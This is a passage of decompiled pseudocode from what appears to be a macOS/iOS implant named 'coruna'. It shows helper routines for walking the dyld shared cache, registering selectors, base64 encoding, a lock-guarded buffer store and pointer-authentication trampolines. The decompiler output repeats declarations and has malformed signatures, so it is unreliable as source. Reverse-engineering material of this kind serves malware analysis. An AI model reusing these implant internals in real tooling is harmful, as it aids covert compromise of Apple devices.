      handle = coruna_getsectdatafromframework(val,ptr,data[off],&scratch);
      if (handle != 0) {
        bootargs = (long *)0x0;
        thread_attr = (long *)0x0;
        host_info = 0;
        coruna_implant49c4_via_abort_d610(&bootargs,0,handle,handle + scratch * 8);
        ptr = bootargs;
        if (bootargs == thread_attr) {
fail:
          status = ptr == thread_attr;
          err = !status;
          if (!status) {
            addr = (long)ptr + (handle - (long)bootargs);
          }
        }
        else {
          do {
            if (*ptr == handle) goto fail;
            ptr = ptr + 1;
          } while (ptr != thread_attr);
          err = false;
          status = true;
        }
        if (bootargs != (long *)0x0) {
          thread_attr = bootargs;
          operator_delete(bootargs);
        }
        if ((err) && (!status)) break;
      }
      off = off + 1;
    } while (off != 2);
    if ((addr != 0xffff1102888122) || (base = base + 1, base == 5)) {
      operator_delete(data);
      operator_delete(copy);
      if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
        return addr;
      }
      ___stack_chk_fail();
    }
    ptr = (char *)copy[base];
  } while( true );
}





void * coruna_implant49c4_via_abort_d610(long *handle,void *ctx,void *scratch,void *data_3)
{
  unsigned long u;
  void *ptr;
  uint64_t *ptr;
  uint64_t *buf;
  long handle;
  uint64_t *str;
  uint64_t *copy;
  unsigned long size;
  unsigned long version;
  long addr;
  size_t ls11;
  long off;
  void *scratch;
  void *bootargs;
  void *thread_attr;
  void *host_info;
  long *serial_buf;
  
  version = (long)data_3 - (long)scratch;
  if (0 < (long)version) {
    off = (long)version >> 3;
    ptr = (uint64_t *)handle[1];
    if (handle[2] - (long)ptr >> 3 < off) {
      addr = *handle;
      u = off + ((long)ptr - addr >> 3);
      if (u >> 0x3d != 0) {
        coruna_abort_d610();
fail:
        coruna_abort_d4e0();
      }
      serial_buf = handle + 2;
      handle = handle[2] - addr;
      size = handle >> 2;
      if (u <= size) {
        u = size;
      }
      if (0xffffffffffffffe < (unsigned long)(handle >> 3)) {
        u = 0x1fffffffffffffff;
      }
      if (u == 0) {
        scratch = (void *)0x0;
      }
      else {
        if (u >> 0x3d != 0) goto fail;
        scratch = operator_new(u << 3);
      }
      ptr = (void *)((long)scratch + ((long)ctx - addr >> 3) * 8);
      host_info = (void *)((long)scratch + u * 8);
      bootargs = ptr;
      _memcpy(ptr,scratch,version & 0xfffffffffffffff8);
      thread_attr = (void *)((long)ptr + off * 8);
      ctx = (void *)coruna_implant41e4_residual_63(handle,&scratch,ctx);
      if ((long)thread_attr - (long)bootargs != 0) {
        thread_attr = (void *)((long)thread_attr +
                           (((long)thread_attr - (long)bootargs) - 8U >> 3 ^ 0xffffffffffffffff) * 8);
      }
      if (scratch != (void *)0x0) {
        operator_delete(scratch);
      }
    }
    else {
      addr = (long)ptr - (long)ctx >> 3;
      str = ptr;
      if (addr < off) {
        ptr = (void *)((long)scratch + addr * 8);
        ls11 = (long)data_3 - (long)ptr;
        if (0 < (long)ls11) {
          _memcpy(ptr,ptr,ls11);
          str = (uint64_t *)((long)ptr + ls11);
        }
        handle[1] = (long)str;
        data_3 = ptr;
        if ((long)ptr - (long)ctx < 1) {
          return ctx;
        }
      }
      ls11 = (long)str - (long)((long)ctx + off * 8);
      buf = str;
      for (copy = str + -off; copy < ptr; copy = copy + 1) {
        *buf = *copy;
        buf = buf + 1;
      }
      handle[1] = (long)buf;
      if (ls11 != 0) {
        _memmove(str + -((long)ls11 >> 3),ctx,ls11);
      }
      if ((long)data_3 - (long)scratch != 0) {
        _memmove(ctx,scratch,(long)data_3 - (long)scratch);
      }
    }
  }
  return ctx;
}





uint64_t coruna_implant49c4_via_implant49c4_str_auth_const(uint64_t val)
{
  long handle;
  uint64_t u;
  
  handle = coruna_dlclose_ccdc();
  if (handle != 0) {
    u = coruna_implant49c4_str_auth_const(val,handle);
    return u;
  }
  return 0xffff1102888122;
}





long coruna_implant49c4_via_implant49c4_via_implant49c4_str_auth_const(void)
{
  long handle;
  long addr;
  
  addr = coruna_implant49c4_via_implant49c4_str_auth_const();
  handle = 0xffff1102888122;
  if (addr != 0) {
    handle = addr + -0x10;
  }
  return handle;
}





long coruna_sel_registername_d150(uint64_t val,uint64_t id_2)
{
  long handle;
  long addr;
  
  addr = _sel_registerName(id_2);
  handle = 0xffff1102888122;
  if (addr != 0) {
    handle = addr;
  }
  return handle;
}





void coruna_dyld_shared_cache_for_each_image(long handle,uint64_t val)
{
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  uint64_t scratch;
  uint64_t action;
  
  scratch = k_implant_nsconcretestackblock_slot;
  bootargs = k_implant_rodata_word_ec18;
  thread_attr = coruna_dyld_image_get_installname;
  host_info = &k_implant_bss_slot_10968;
  action = *(uint64_t *)(handle + 0x30);
  scratch = *(uint64_t *)(handle + 0x28);
  serial_buf = *(uint64_t *)(handle + 0x20);
  _dyld_shared_cache_for_each_image(val,&scratch);
  return;
}





void coruna_dyld_image_get_installname(long handle,uint64_t val)
{
  int err;
  char *ptr;
  
  if (((*(char *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) == '\0') &&
      (ptr = (char *)_dyld_image_get_installname(val), ptr != (char *)0x0)) &&
     (err = _strcmp(ptr,*(char **)(handle + 0x30)), err == 0)) {
    (**(void (**)(*(long *)(handle + 0x20) + 0x10))(*(long *)(handle + 0x20),val);
    *(uint8_t *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) = 1;
  }
  return;
}





void coruna_block_assign_1bf3c(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),7);
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  return;
}





void coruna_block_dispose_1bf78(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  __Block_object_dispose(*(void **)(handle + 0x20),7);
  return;
}





void coruna_abort_d4d4(void)
{
  _abort();
}





void coruna_abort_d4e0(void)
{
  _abort();
}
uint64_t * coruna_implant41e4_residual_8(uint64_t *val)
{
  void *ptr;
  void *buf;
  void *str;
  
  str = (void *)*val;
  if (str != (void *)0x0) {
    buf = (void *)val[1];
    ptr = str;
    if (buf != str) {
      do {
        buf = (void *)((long)buf + -0x18);
      } while (buf != str);
      ptr = (void *)*val;
    }
    val[1] = str;
    operator_delete(ptr);
  }
  return val;
}





long coruna_implant41e4_residual_63(uint64_t *val,uint64_t *id_2,uint64_t *size_3)
{
  void *ptr;
  void *buf;
  size_t ls3;
  uint64_t *ptr;
  uint64_t u;
  uint64_t *buf;
  long handle;
  uint64_t *str;
  
  handle = id_2[1];
  buf = (void *)*val;
  ls3 = (long)size_3 - (long)buf;
  ptr = (void *)(handle - ls3);
  id_2[1] = ptr;
  if (0 < (long)ls3) {
    _memcpy(ptr,buf,ls3);
  }
  ptr = (uint64_t *)val[1];
  if (ptr != size_3) {
    buf = (uint64_t *)id_2[2];
    do {
      str = size_3 + 1;
      *buf = *size_3;
      buf = (uint64_t *)(id_2[2] + 8);
      id_2[2] = buf;
      size_3 = str;
    } while (str != ptr);
  }
  u = *val;
  *val = id_2[1];
  id_2[1] = u;
  u = val[1];
  val[1] = id_2[2];
  id_2[2] = u;
  u = val[2];
  val[2] = id_2[3];
  id_2[3] = u;
  *id_2 = id_2[1];
  return handle;
}





void coruna_abort_d610(void)
{
  _abort();
}





unsigned long coruna_return_zero_d464(long arg,int val)

{
  uint u;
  unsigned long size;
  
  if (0xbd81a989 < arg - 1U) {
    return 0;
  }
  if (val != 2) {
    u = (int)arg + 2;
    if (val != 1) {
      size = 0;
      if (val == 0) {
        size = (unsigned long)u * 0xaaaaaaab >> 0x1f & 0x1fffffffc;
      }
      return size;
    }
    size = (unsigned long)u * 0xaaaaaaab >> 0x1f & 0x1fffffffc;
    return size + (unsigned long)((int)size - 1U >> 2) / 0x13;
  }
  return (arg << 2 | 2U) / 3;
}





void coruna_implant49c4_residual_61(unsigned long *arg,long *handle,int flags,int count_2)
{
  bool err;
  uint8_t *ptr;
  unsigned long u;
  int err;
  unsigned long size;
  uint version;
  unsigned long port;
  byte *ptr;
  int status;
  uint tag;
  unsigned long kind;
  long handle;
  unsigned long type_id;
  
  ptr = &UNK_0000ec20;
  if (count_2 != 1) {
    ptr = &k_implant_rodata_word_ec60;
  }
  err = 0x4c < (unsigned long)(handle[1] - *handle);
  port = *arg;
  u = arg[1] - port;
  if (u < 2 || arg[1] - 2 == port) {
    size = 0;
    version = 0;
    tag = 0;
  }
  else {
    type_id = 0;
    version = 0;
    size = 0;
    kind = 1;
    do {
      if (flags == 1 && err) {
        if ((version != 0) && (version % 0x4c == 0)) {
          *(uint8_t *)(*handle + size) = 10;
          size = (unsigned long)((int)size + 1);
          port = *arg;
        }
        version = version + 4;
      }
      *(uint8_t *)(*handle + size) = ptr[*(byte *)(port + type_id) >> 2];
      err = (int)size;
      *(uint8_t *)(*handle + (unsigned long)(err + 1)) =
           ptr[((unsigned long)*(byte *)(*arg + type_id) & 3) << 4 |
                  (unsigned long)(*(byte *)(*arg + kind) >> 4)];
      status = (int)kind;
      *(uint8_t *)(*handle + (unsigned long)(err + 2)) =
           ptr[((unsigned long)*(byte *)(*arg + kind) & 0xf) << 2 |
                  (unsigned long)(*(byte *)(*arg + (unsigned long)(status + 1U)) >> 6)];
      size = (unsigned long)(err + 4);
      *(uint8_t *)(*handle + (unsigned long)(err + 3)) =
           ptr[(unsigned long)*(byte *)(*arg + (unsigned long)(status + 1U)) & 0x3f];
      type_id = (unsigned long)(status + 2);
      port = *arg;
      u = arg[1] - port;
      kind = (unsigned long)(status + 3);
    } while (type_id < u - 2);
    tag = status + 2;
  }
  if (tag < u) {
    u = (unsigned long)tag;
    if (((flags == 1 && err) && version != 0) && version % 0x4c == 0) {
      *(uint8_t *)(*handle + size) = 10;
      size = (unsigned long)((int)size + 1);
      port = *arg;
    }
    *(uint8_t *)(*handle + size) = ptr[*(byte *)(port + u) >> 2];
    err = (int)size;
    version = err + 1;
    port = *arg;
    if (u < ~port + arg[1]) {
      *(uint8_t *)(*handle + (unsigned long)version) =
           ptr[((unsigned long)*(byte *)(port + u) & 3) << 4 |
                  (unsigned long)(*(byte *)(port + (tag + 1)) >> 4)];
      version = err + 2;
      ptr = (byte *)(*arg + (unsigned long)(tag + 1));
      status = 3;
      port = 0x3c;
      handle = 2;
    }
    else {
      ptr = (byte *)(port + u);
      status = 2;
      port = 0x30;
      handle = 4;
    }
    size = (unsigned long)(uint)(err + status);
    *(uint8_t *)(*handle + (unsigned long)version) = ptr[(unsigned long)*ptr << handle & port];
  }
  handle = *handle;
  if (size < (unsigned long)(handle[1] - handle)) {
    version = (uint)size;
    do {
      version = version + 1;
      *(uint8_t *)(handle + size) = 0x3d;
      size = (unsigned long)version;
      handle = *handle;
    } while ((unsigned long)version < (unsigned long)(handle[1] - handle));
  }
  return;
}
unsigned long coruna_implant49c4_via_pthread_rwlock_destroy(uint64_t *arg,long val)

{
  int *err;
  uint *buf;
  int status;
  uint version;
  void *ptr;
  bool err;
  int flags;
  uint32_t *str;
  int *status;
  void *buf;
  long addr;
  long off;
  unsigned long port;
  long base;
  unsigned long tag;
  unsigned long kind;
  uint scratch;
  void *bootargs;
  
  tag = 0xad001;
  if ((arg != (uint64_t *)0x0) && (val != 0)) {
    bootargs = (void *)0x0;
    tag = coruna_pthread_rwlock_init(&bootargs,0x18);
    if ((int)tag == 0) {
      str = _calloc(1,0x38);
      ptr = bootargs;
      if (str == (uint32_t *)0x0) {
        coruna_pthread_rwlock_destroy(bootargs);
        tag = 0xad009;
      }
      else {
        *str = 0x10001;
        *(void **)(str + 2) = bootargs;
        *(void (**)(str + 4) = coruna_pthread_rwlock_unlock_1cbc8;
        *(void (**)(str + 6) = coruna_pthread_rwlock_rdlock;
        *(void (**)(str + 8) = coruna_pthread_rwlock_rdlock_1cd00;
        *(void (**)(str + 10) = coruna_pthread_rwlock_rdlock_1cd7c;
        *(void (**)(str + 0xc) = coruna_pthread_rwlock_unlock_1ce64;
        err = (int *)((long)bootargs + 0xf0);
        kind = 0;
        do {
          flags = *(int *)(val + kind * 0x30 + 0x140);
          if (flags == 0) {
            tag = 0;
          }
          else {
            off = val + kind * 0x30;
            addr = *(long *)(off + 0x148);
            if (addr == 0) {
              tag = 0xad014;
              goto fail;
            }
            base = val + kind * 0x30;
            status = *(int *)(base + 0x150);
            if (status == 0 || ptr == (void *)0x0) {
              version = 0xad014;
              if (status != 0) {
                version = 0xad001;
              }
              tag = (unsigned long)version;
              goto fail;
            }
            buf = (uint *)(base + 0x150);
            version = *(uint *)((long)ptr + 0xe8);
            port = (unsigned long)version;
            status = err;
            tag = port;
            if (version != 0) {
              do {
                if (*status == flags) {
                  bootargs = (void *)0x0;
                  scratch = 0;
                  tag = coruna_implant_resolve_typed_buffer(ptr,status,&bootargs,&scratch);
                  if ((int)tag == 0) {
                    buf = *(void **)(off + 0x148);
                    version = *buf;
                    if ((bootargs == buf && scratch == version) ||
                       ((scratch == version &&
                        (flags = _memcmp(bootargs,buf,(unsigned long)scratch), flags == 0)))) {
                      tag = 0;
                    }
                    else {
                      tag = 0x700a;
                    }
                  }
                  if ((int)tag != 0) goto done;
                  goto cleanup;
                }
                status = status + 8;
                tag = tag - 1;
              } while (tag != 0);
            }
            if (*(uint *)((long)ptr + 0xe4) <= version) {
              tag = 0x7006;
              goto fail;
            }
            tag = 0;
            *(int *)((long)ptr + port * 0x20 + 0xf0) = flags;
            *(uint8_t *)((long)ptr + port * 0x20 + 0xf8) = 2;
            *(long *)((long)ptr + port * 0x20 + 0x100) = addr;
            *(uint *)((long)ptr + port * 0x20 + 0x108) = *buf;
            *(uint *)((long)ptr + 0xe8) = version + 1;
          }
cleanup:
          err = kind < 0x17;
          kind = kind + 1;
        } while (err);
done:
        if ((int)tag == 0) {
          tag = 0;
          *arg = str;
        }
        else {
fail:
          if (*(long *)(str + 2) != 0) {
            coruna_pthread_rwlock_destroy();
            _free(str);
          }
        }
      }
    }
  }
  return tag;
}





uint64_t coruna_pthread_rwlock_unlock_1cbc8(long handle,long addr_2,uint64_t val)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && (int)val != 0)) {
    err = _pthread_rwlock_wrlock(ptr);
    if (err == 0) {
      u = coruna_return_zero_1d074(ptr,2,addr_2,val);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_rdlock(long handle,int flags,long addr_2,long off_3)
{
  int err;
  char *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint64_t size;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ((ptr != (pthread_rwlock_t *)0x0 && flags != 0) && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
      if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
        ptr = ptr[1].__opaque;
        do {
          ptr = ptr + 0x20;
          if (*(int *)ptr == flags) {
            size = coruna_implant_resolve_typed_buffer(ptr,ptr,addr_2,off_3);
            goto fail;
          }
          u = u - 1;
        } while (u != 0);
      }
      size = 0x7003;
fail:
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint64_t coruna_pthread_rwlock_rdlock_1cd00(long handle,long addr_2,long off_3)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = coruna_implant_match_remote_buffer(ptr,addr_2,off_3);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_rdlock_1cd7c(long handle,void (*val,uint64_t val)
{
  uint32_t u;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t size;
  char *ptr;
  unsigned long version;
  uint32_t scratch;
  uint64_t bootargs;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ptr != (pthread_rwlock_t *)0x0 && arg != (void (*)0x0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      ptr = ptr[1].__opaque;
      version = 0xffffffffffffffff;
      do {
        ptr = ptr + 0x20;
        version = version + 1;
        if (*(uint *)(ptr[1].__opaque + 0x18) <= version) {
          size = 0;
          break;
        }
        u = *(uint32_t *)ptr;
        bootargs = 0;
        scratch = 0;
        size = coruna_implant_resolve_typed_buffer(ptr,ptr,&bootargs,&scratch);
        if ((int)size != 0) break;
        size = (*arg)(handle,u,bootargs,scratch,val);
      } while ((int)size == 0);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint64_t coruna_pthread_rwlock_unlock_1ce64(long handle,uint64_t val,void *ctx,uint size)
{
  int err;
  void *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint64_t size;
  void *buf;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  size = 0xad001;
  if (handle != 0) {
    ptr = *(pthread_rwlock_t **)(handle + 8);
    if (((ptr != (pthread_rwlock_t *)0x0 && (uint)val != 0) && ctx != (void *)0x0) &&
        size != 0) {
      err = _pthread_rwlock_wrlock(ptr);
      if (err == 0) {
        u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
        if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
          ptr = ptr[1].__opaque + 0x38;
          do {
            if (*(uint *)(ptr + -0x18) == (uint)val) {
              ptr = _malloc((unsigned long)size);
              if (ptr == (void *)0x0) {
                size = 0xad009;
              }
              else {
                _memcpy(ptr,ctx,(unsigned long)size);
                if (ptr[-0x10] == '\x03') {
                  buf = *(void **)(ptr + -8);
                  _bzero(buf,(unsigned long)*(uint *)ptr);
                  _free(buf);
                }
                else if (ptr[-0x10] == '\x01') {
                  _bzero((void *)(*(long *)(ptr[1].__opaque + 8) + *(long *)(ptr + -8)),
                         (unsigned long)*(uint *)ptr);
                }
                ptr[-0x10] = '\x03';
                *(void **)(ptr + -8) = ptr;
                *(uint *)ptr = size;
                if (ptr[1].__sig == 0) {
                  size = 0;
                }
                else {
                  bootargs = (void *)0x0;
                  scratch = 0;
                  size = coruna_implant_match_remote_buffer(ptr,&bootargs,&scratch);
                  if ((int)size == 0) {
                    size = (*(void (*)ptr[1].__sig)
                                      (val,bootargs,scratch,*(uint64_t *)ptr[1].__opaque);
                    _bzero(bootargs,(unsigned long)scratch);
                    _free(bootargs);
                  }
                }
              }
              goto fail;
            }
            ptr = ptr + 0x20;
            u = u - 1;
          } while (u != 0);
        }
        size = 0x7003;
fail:
        _pthread_rwlock_unlock(ptr);
      }
      else {
        size = 0xad020;
      }
    }
  }
  return size;
}





uint64_t coruna_implant_resolve_typed_buffer(long handle,long addr_2,long *off_3,uint32_t *size)
{
  char err;
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) &&
     (size != (uint32_t *)0x0)) {
    err = *(char *)(addr_2 + 8);
    if ((err == '\x03') || (err == '\x02')) {
      handle = *(long *)(addr_2 + 0x10);
      if (handle == 0) {
        return 0xad014;
      }
    }
    else {
      if (err != '\x01') {
        return 0x700c;
      }
      if (*(long *)(handle + 0xd8) == 0) {
        return 0xad014;
      }
      handle = *(long *)(handle + 0xd8) + *(long *)(addr_2 + 0x10);
    }
    u = 0;
    *off_3 = handle;
    *size = *(uint32_t *)(addr_2 + 0x18);
  }
  return u;
}





unsigned long coruna_return_zero_1d074(long arg,int val,int *n,uint m)

{
  uint u;
  int *flags;
  int status;
  uint version;
  unsigned long type_id;
  unsigned long type_id_8;
  long handle;
  unsigned long type_id_9;
  int *status;
  uint *copy;
  unsigned long type_id_10;
  uint *data;
  uint scratch;
  void *bootargs;
  
  if (((arg == 0) || (n == (int *)0x0)) || (m == 0)) {
check_ok:
    type_id = 0xad001;
  }
  else {
    if ((7 < m) && (*n == -0xff24111)) {
      version = n[1];
      if ((version != 0) && (type_id = (unsigned long)version << 4 | 8, type_id <= m)) {
        status = *(int *)(arg + 0xe8);
        if ((uint)(*(int *)(arg + 0xe4) - status) < version) {
          return 0xad009;
        }
        type_id_9 = 0;
        do {
          flags = n + type_id_9 * 4 + 2;
          if (*flags == 0) {
            return 0x700c;
          }
          data = (uint *)(flags + 2);
          version = *data;
          if (version < (uint)type_id) {
            return 0x700c;
          }
          copy = (uint *)(n + type_id_9 * 4 + 5);
          if (*copy == 0) {
            return 0x700c;
          }
          u = *copy + version;
          if (u <= version || m < u) {
            return 0x700c;
          }
          type_id_10 = 0xffffffffffffffff;
          status = (int *)(arg + 0xf0);
          do {
            version = *(uint *)(arg + 0xe8);
            type_id_10 = type_id_10 + 1;
            if (version <= type_id_10) {
              if (val == 2) {
                type_id_8 = (unsigned long)(uint)(status + (int)type_id_9);
                handle = arg + type_id_8 * 0x20;
                *(uint64_t *)(handle + 0xf0) = *(uint64_t *)flags;
                *(uint8_t *)(handle + 0xf8) = 2;
                type_id_10 = (long)n + (unsigned long)*data;
              }
              else {
                if (val != 1) goto check_ok;
                type_id_8 = (unsigned long)(uint)(status + (int)type_id_9);
                handle = arg + type_id_8 * 0x20;
                *(uint64_t *)(handle + 0xf0) = *(uint64_t *)flags;
                *(uint8_t *)(handle + 0xf8) = 1;
                type_id_10 = (unsigned long)*data;
              }
              *(unsigned long *)(handle + 0x100) = type_id_10;
              *(uint *)(arg + type_id_8 * 0x20 + 0x108) = *copy;
              *(uint *)(arg + 0xe8) = version + 1;
              goto skip;
            }
            if (*flags == *status) {
              bootargs = (void *)0x0;
              scratch = 0;
              type_id_8 = coruna_implant_resolve_typed_buffer(arg,status,&bootargs,&scratch);
              if ((int)type_id_8 == 0) {
                if (bootargs == (void *)((long)n + (unsigned long)*data) && scratch == *copy) {
                  type_id_8 = 0;
                }
                else {
                  if (scratch == *copy) {
                    version = _memcmp(bootargs,(void *)((long)n + (unsigned long)*data),
                                    (unsigned long)scratch);
                    type_id_8 = (unsigned long)version;
                    if (version == 0) goto next;
                  }
                  type_id_8 = 0x700a;
                }
              }
            }
            else {
              type_id_8 = 0x7003;
            }
next:
            status = status + 8;
          } while ((int)type_id_8 == 0x7003);
          if ((int)type_id_8 != 0) {
            return type_id_8;
          }
skip:
          type_id_9 = type_id_9 + 1;
          if ((uint)n[1] <= type_id_9) {
            return 0;
          }
        } while( true );
      }
    }
    type_id = 0x700b;
  }
  return type_id;
}





uint64_t coruna_implant_match_remote_buffer(long handle,uint64_t *val,uint *size)
{
  uint u;
  int err;
  uint32_t *ptr;
  unsigned long size;
  uint64_t version;
  long handle;
  unsigned long port;
  uint64_t *buf;
  unsigned long tag;
  uint *str;
  uint scratch;
  void *bootargs;
  
  version = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) {
    if (*(int *)(handle + 0xe8) == 0) {
      version = 0x7007;
    }
    else {
      port = 0;
      tag = (unsigned long)(*(int *)(handle + 0xe8) * 0x10 + 0x27U & 0xffffffe0);
      handle = handle + 0xf0;
      size = tag;
      do {
        bootargs = (void *)0x0;
        scratch = 0;
        version = coruna_implant_resolve_typed_buffer(handle,handle,&bootargs,&scratch);
        if ((int)version != 0) {
          return version;
        }
        port = port + 1;
        u = (scratch + 0x1f & 0xffffffe0) + (int)size;
        size = (unsigned long)u;
        handle = handle + 0x20;
      } while (port < *(uint *)(handle + 0xe8));
      ptr = _malloc(size);
      if (ptr == (uint32_t *)0x0) {
        version = 0xad009;
      }
      else {
        _bzero(ptr,size);
        err = *(int *)(handle + 0xe8);
        *ptr = 0xf00dbeef;
        ptr[1] = err;
        if (err != 0) {
          port = 0;
          str = ptr + 5;
          buf = (uint64_t *)(handle + 0xf0);
          do {
            bootargs = (void *)0x0;
            scratch = 0;
            version = coruna_implant_resolve_typed_buffer(handle,buf,&bootargs,&scratch);
            if ((int)version != 0) {
              _bzero(ptr,size);
              _free(ptr);
              return version;
            }
            str[-1] = (uint)tag;
            *str = scratch;
            *(uint64_t *)(str + -3) = *buf;
            _memcpy((void *)((long)ptr + tag),bootargs,(unsigned long)scratch);
            tag = (unsigned long)((scratch + 0x1f & 0xffffffe0) + (uint)tag);
            port = port + 1;
            str = str + 4;
            buf = buf + 4;
          } while (port < *(uint *)(handle + 0xe8));
        }
        version = 0;
        *val = ptr;
        *size = u;
      }
    }
  }
  return version;
}





uint64_t coruna_pthread_rwlock_destroy(pthread_rwlock_t *arg)
{
  uint u;
  unsigned long size;
  char *ptr;
  
  if (arg != (pthread_rwlock_t *)0x0) {
    _pthread_rwlock_destroy(arg);
    u = *(uint *)(arg[1].__opaque + 0x18);
    if (u != 0) {
      size = 0;
      ptr = arg[1].__opaque + 0x38;
      do {
        if (ptr[-0x10] == '\x03') {
          _bzero(*(void **)(ptr + -8),(unsigned long)*(uint *)ptr);
          _free(*(void **)(ptr + -8));
          u = *(uint *)(arg[1].__opaque + 0x18);
        }
        size = size + 1;
        ptr = ptr + 0x20;
      } while (size < u);
    }
    if ((*(void **)(arg[1].__opaque + 8) != (void *)0x0) &&
       (*(uint *)(arg[1].__opaque + 0x10) != 0)) {
      _bzero(*(void **)(arg[1].__opaque + 8),(unsigned long)*(uint *)(arg[1].__opaque + 0x10));
      _free(*(void **)(arg[1].__opaque + 8));
    }
    _bzero(arg,(unsigned long)*(uint *)(arg[1].__opaque + 0x14) * 0x20 + 0xf0);
    _free(arg);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_pthread_rwlock_init(uint64_t *val,uint size)
{
  size_t ls1;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    if (size < 0x19) {
      size = 0x18;
    }
    ls1 = (unsigned long)size * 0x20 + 0xf0;
    ptr = _malloc(ls1);
    if (ptr == (pthread_rwlock_t *)0x0) {
      u = 0xad009;
    }
    else {
      _bzero(ptr,ls1);
      err = _pthread_rwlock_init(ptr,(pthread_rwlockattr_t *)0x0);
      if (err == 0) {
        u = 0;
        *(uint *)(ptr[1].__opaque + 0x14) = size;
        *val = ptr;
      }
      else {
        _bzero(ptr,ls1);
        _free(ptr);
        u = 0xad020;
      }
    }
  }
  return u;
}





void coruna_implant49c4_via_pacia_2(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_implant_insn_word_e5ac != 0) {
    coruna_pacia_2();
    coruna_ret_stub_3(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}





void coruna_implant49c4_via_pacia_2_2(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_implant_insn_word_e5ac != 0) {
    coruna_pacia_2();
    coruna_ret_stub_3(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}
void coruna_pacia_2(void)
{
  return;
}
void coruna_helper_1248c_e66c(void)
{
  return;
}
void coruna_helper_1248c_e6a8(void)
{
  return;
}
void coruna_helper_1248c_e6e4(void)
{
  return;
}





void coruna_ret_stub_2(uint64_t val,uint64_t id_2)
{
  (*k_implant_insn_word_e5ac)(0xb389,val,id_2,k_implant_insn_word_e59c);
  return;
}





void coruna_ret_stub_3(uint64_t val,uint64_t id_2)
{
  (*k_implant_insn_word_e5ac)(0xb389,val,id_2,k_implant_insn_word_e5a4);
  return;
}

